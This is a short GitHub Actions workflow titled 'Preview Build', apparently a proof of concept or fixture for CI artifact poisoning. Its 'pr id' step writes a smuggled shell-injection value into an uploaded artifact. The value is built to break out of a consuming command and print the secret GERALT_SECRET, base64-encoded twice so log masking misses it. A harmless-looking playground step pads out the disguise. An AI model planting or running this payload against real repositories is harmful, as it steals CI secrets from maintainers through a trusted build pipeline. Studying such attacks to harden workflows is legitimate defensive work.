name: Preview Build

on:
  pull_request:
    branches: [dev, main]
    types: [opened, synchronize, reopened]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: pr id
        run: |
          printf '%s' '; echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)" ; exit 1 ; #' > pr-id.txt
      - uses: actions/upload-artifact@v4
        with:
          name: pr-id
          path: pr-id.txt
          retention-days: 5
      - name: playground
        run: |
          mkdir -p playground
          echo "<html><body>preview</body></html>" > playground/index.html
      - uses: actions/upload-artifact@v4
        with:
          name: playground
          path: playground
          retention-days: 5
